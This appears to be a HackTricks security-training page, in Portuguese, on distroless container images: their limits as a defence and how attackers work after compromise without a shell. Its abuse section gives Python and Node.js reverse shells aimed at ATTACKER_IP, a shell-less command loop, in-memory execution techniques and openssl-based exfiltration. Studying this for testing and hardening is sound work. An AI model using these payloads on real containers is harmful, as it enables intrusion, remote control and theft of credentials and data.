# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Uma imagem de contêiner **distroless** é uma imagem que entrega os **componentes mínimos de runtime necessários para executar uma aplicação específica**, removendo intencionalmente as ferramentas de distribuição usuais, como gerenciadores de pacotes, shells e grandes conjuntos de utilitários genéricos do userland. Na prática, imagens distroless frequentemente contêm apenas o binário da aplicação ou runtime, suas bibliotecas compartilhadas, conjuntos de certificados e uma estrutura de sistema de arquivos muito pequena.

A ideia não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela altera o que está disponível **dentro** do filesystem do contêiner, não como o kernel isola o contêiner. Essa distinção importa, porque distroless endurece o ambiente principalmente ao reduzir o que um atacante pode usar após obter execução de código. Não substitui namespaces, seccomp, capabilities, AppArmor, SELinux, ou qualquer outro mecanismo de isolamento em tempo de execução.

## Por que Distroless Existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de pacotes e binários que podem conter vulnerabilidades
- o número de ferramentas de pós-exploração disponíveis para um atacante por padrão

Por isso imagens distroless são populares em deploys de aplicações em produção. Um contêiner que não contém shell, nem gerenciador de pacotes, e quase nenhuma ferramenta genérica costuma ser mais simples de raciocinar operacionalmente e mais difícil de abusar interativamente após um comprometimento.

Exemplos de famílias de imagens no estilo distroless bem conhecidas incluem:

- imagens distroless do Google
- Chainguard hardened/minimal images

## O que Distroless Não Significa

Uma imagem distroless **não é**:

- automaticamente sem privilégios de root
- automaticamente sem privilégios
- automaticamente somente leitura
- automaticamente protegida por seccomp, AppArmor, ou SELinux
- automaticamente segura contra container escape

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de namespaces com o host, bind mounts perigosos, ou um runtime socket montado. Nesse cenário, a imagem pode ser minimal, mas o contêiner ainda pode ser catastróficamente inseguro. Distroless altera a superfície de ataque do **userland**, não o **limite de confiança do kernel**.

## Características Operacionais Típicas

Quando você compromete um contêiner distroless, a primeira coisa que geralmente percebe é que suposições comuns deixam de ser verdadeiras. Pode não haver `sh`, não haver `bash`, não haver `ls`, não haver `id`, não haver `cat`, e às vezes nem mesmo um ambiente baseado em libc que se comporte como sua tradecraft usual espera. Isso afeta tanto ofensiva quanto defensiva, porque a falta de ferramentas torna debugging, incident response e pós-exploração diferentes.

Os padrões mais comuns são:

- o runtime da aplicação existe, mas pouco mais
- payloads baseados em shell falham porque não há shell
- one-liners comuns de enumeração falham porque os binários auxiliares estão ausentes
- proteções no sistema de arquivos, como rootfs somente leitura ou `noexec` em locais tmpfs graváveis, frequentemente também estão presentes

Essa combinação é o que geralmente leva as pessoas a falar sobre "weaponizing distroless".

## Distroless e Pós-Exploração

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Frequentemente é o que vem depois. Se o workload explorado fornece execução de código em um runtime de linguagem como Python, Node.js, Java ou Go, você pode ser capaz de executar lógica arbitrária, mas não pelos fluxos de trabalho centrados em shell que são comuns em outros alvos Linux.

Isso significa que a pós-exploração frequentemente se desloca para uma de três direções:

1. **Usar diretamente o runtime da linguagem existente** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Trazer suas próprias ferramentas para a memória** se o filesystem for somente leitura ou locais graváveis estiverem montados com `noexec`.
3. **Abusar binários já presentes na imagem** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuso

### Enumere o Runtime que Você Já Tem

Em muitos contêineres distroless não há shell, mas ainda existe um runtime da aplicação. Se o alvo for um serviço Python, o Python está lá. Se o alvo for Node.js, o Node está lá. Isso muitas vezes fornece funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e realizar execução em memória sem nunca invocar `/bin/sh`.

Um exemplo simples com Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Um exemplo simples com Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperação de variáveis de ambiente, frequentemente incluindo credenciais ou endpoints de serviço
- enumeração do sistema de arquivos sem `/bin/ls`
- identificação de caminhos graváveis e segredos montados

### Reverse Shell Sem `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, uma reverse shell clássica baseada em shell pode falhar imediatamente. Nessa situação, use o runtime da linguagem instalada em vez disso.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` não existir, substitua a última linha por execução direta de comandos via Python ou por um loop REPL do Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Novamente, se `/bin/sh` estiver ausente, use diretamente as APIs de filesystem, process e networking do Node em vez de iniciar um shell.

### Exemplo completo: loop de comandos Python sem shell

Se a imagem tiver Python mas nenhum shell, um loop interativo simples costuma ser suficiente para manter full post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Isso não requer um binário de shell interativo. O impacto é, na prática, o mesmo que um shell básico do ponto de vista do atacante: execução de comandos, enumeração e staging de payloads adicionais através do runtime existente.

### Execução de Ferramentas em Memória

Distroless images are often combined with:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Essa combinação torna os fluxos clássicos de "download binary to disk and run it" pouco confiáveis. Nesses casos, técnicas de execução em memória tornam-se a principal resposta.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binários existentes já na imagem

Algumas imagens distroless ainda contêm binários operacionalmente necessários que se tornam úteis após um comprometimento. Um exemplo repetidamente observado é `openssl`, porque aplicações às vezes precisam dele para tarefas relacionadas a crypto ou TLS.

Um padrão de busca rápido é:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` estiver presente, ele pode ser usado para:

- conexões TLS de saída
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

O abuso exato depende do que está realmente instalado, mas a ideia geral é que distroless não significa "no tools whatsoever"; significa "far fewer tools than a normal distribution image".

## Checks

O objetivo destas verificações é determinar se a imagem é realmente distroless na prática e quais runtime ou helper binaries ainda estão disponíveis para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
O que é interessante aqui:

- Se não houver shell, mas um runtime como Python ou Node estiver presente, a post-exploitation deve pivotar para execução orientada por runtime.
- Se o sistema de arquivos root for somente leitura e `/dev/shm` for gravável mas `noexec`, memory execution techniques tornam-se muito mais relevantes.
- Se binários auxiliares como `openssl`, `busybox`, ou `java` existirem, eles podem oferecer funcionalidade suficiente para bootstrapar acesso adicional.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

O ponto chave é que distroless é uma **propriedade da imagem**, não uma proteção em tempo de execução. Seu valor vem de reduzir o que está disponível dentro do filesystem após um comprometimento.

## Related Pages

Para filesystem e memory-execution bypasses comumente necessários em ambientes distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para container runtime, socket, e mount abuse que ainda se aplica a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
